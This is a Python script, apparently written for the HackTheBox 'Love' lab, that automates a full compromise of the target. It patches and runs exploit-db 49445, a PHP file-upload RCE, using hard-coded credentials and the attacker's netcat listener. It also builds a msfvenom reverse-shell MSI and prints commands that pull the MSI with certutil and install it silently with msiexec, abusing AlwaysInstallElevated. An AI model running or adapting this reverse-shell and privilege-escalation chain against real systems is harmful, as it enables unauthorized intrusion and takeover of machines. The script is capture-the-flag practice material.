import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Love
    __________________________________________________________________________\n"""
    print(Fore.BLUE + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] Phoebe", "[+] Administrator" , "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.239" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://{target_machine}/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Love Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
#------------------------------------------------------------------------

def conection_user_phoebe():
    commands_send("searchsploit -m php/webapps/49445.py")
    commands_send(f"sed -i '0,/192.168.1.207/s//{target_machine}/' 49445.py")  # Primera coincidencia
    commands_send(f"sed -i 's/192.168.1.207/{machine_ip}/g' 49445.py")       # Las siguientes
    commands_send(f"sed -i 's/potter/admin/g' 49445.py")
    commands_send(f"sed -i 's/password/@LoveIsInTheAir!!!!/g' 49445.py")
    commands_send(f"sed -i 's/8888/443/g' 49445.py")
    commands_send("sed -i 's|/votesystem||g' 49445.py")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Phoebe-user Command (Listen netcat)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [Phoebe-user] > " + Fore.WHITE + f"Press ENTER to continue...")
    commands_send("python3 49445.py")  

def connection_forwarding_nadine_and_root():
    commands_send(f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={machine_ip}LPORT=443 --platform windows -a x64 -f msi -o reverse.msi")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Phoebe-user Command (Listen Http)] > " + Fore.LIGHTMAGENTA_EX + f"sudo python3 -m http.server 80")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Phoebe-user Command (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"\n1. c:\Windows\Temp\n2. mkdir Privesc && cd Privesc\n3. certutil.exe -f -urlcache -split http://{machine_ip}/reverse.msi reverse.msi")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Phoebe-user Command (Listen netcat)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [Phoebe-user] > " + Fore.WHITE + f"Press ENTER to continue...")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[Phoebe-user Command (Listen netcat)] > " + Fore.LIGHTMAGENTA_EX + f"msiexec /quiet /qn /i reverse.msi")

#------------------------------------------------------------------------

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","Phoebe connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Phoebe-user Exploit (SSRF)] > " + Fore.LIGHTMAGENTA_EX + f"http://staging.love.htb/")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Phoebe-user Exploit (Malicious File)] > " + Fore.LIGHTMAGENTA_EX + f"http://{target_machine}/admin/voters_add.php")
                conection_user_phoebe()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Phoebe] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Administrator connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator-user Exploit (AlwaysInstallElevated)] > " + Fore.LIGHTMAGENTA_EX + f"https://hacktricks.boitatech.com.br/windows/windows-local-privilege-escalation#alwaysinstallelevated-1")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator] > " + Fore.YELLOW + f"(Exploit) http://{target_machine}");cm.sleep(0.2)
                connection_forwarding_nadine_and_root()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
